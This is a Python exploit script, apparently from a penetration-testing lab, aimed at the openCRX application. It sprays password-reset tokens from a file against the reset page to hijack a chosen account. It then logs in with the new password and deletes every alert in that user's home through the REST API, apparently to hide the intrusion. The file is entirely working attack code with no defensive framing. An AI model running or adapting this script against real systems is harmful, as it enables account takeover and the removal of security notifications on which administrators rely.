#!/usr/bin/python3

import requests
import argparse
import re
session = requests.session()
parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()
reset_status = False
target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        #r = requests.post(url=target, data=payload)
        r = session.post(url=target, data=payload)
        res = r.text
        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            reset_status = True
            break

# logging in so we can delete alerts
if reset_status == True:
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }


    url = "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet"
    get_params = '?loginFailed=false'
    # res = session.get(url+get_params, allow_redirects=True, proxies=proxies)
    res = session.get(url + get_params, allow_redirects=True)
    #print(res.status_code)
    #print("==================================")
    #print(res.cookies)
    #print("==================================")
    #print(res.content)
    #print("==================================")
    url = "http://opencrx:8080/opencrx-core-CRX/j_security_check"
    data = {"j_username": F"{args.user}", "j_password": F"{args.password}"}
    # res = session.post(url, data=data, allow_redirects=True, proxies=proxies)
    res = session.post(url, data=data, allow_redirects=True)
    pattern = re.compile('window.*;') # extract out window.href='redirct_url'
    result = pattern.findall(res.text)
    pattern = re.compile("(?<=')(.*?)(?=')") # extract out redirect url
    result = pattern.findall(result[0])
    #res = session.get(result[0], allow_redirects=True, proxies=proxies)
    #print("HERE",result[0])
    res = session.get(result[0], allow_redirects=True)

    if 'Logoff&nbsp;guest' in str(res.text):
        print('Login Success')
        auth = auth=(args.user, args.password)
        # Deleting Alerts
        url = 'http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert'
        headers = {'Accept': 'application/json'}
        res = session.get(url, allow_redirects=True, headers=headers, auth=auth)
        #print(res.status_code)
        alerts = res.json()
        #print(alerts)
        for i in range(0, int(alerts["@total"])):
            delete_url = alerts['objects'][i]["@href"]
            print("Deleting alert: ", delete_url)
            res = session.delete(delete_url, allow_redirects=True, headers=headers, auth=auth)
            if res.status_code != 204:
                print("error delete alert: ", delete_url)
            #print(res.status_code)   
            #print(res.text)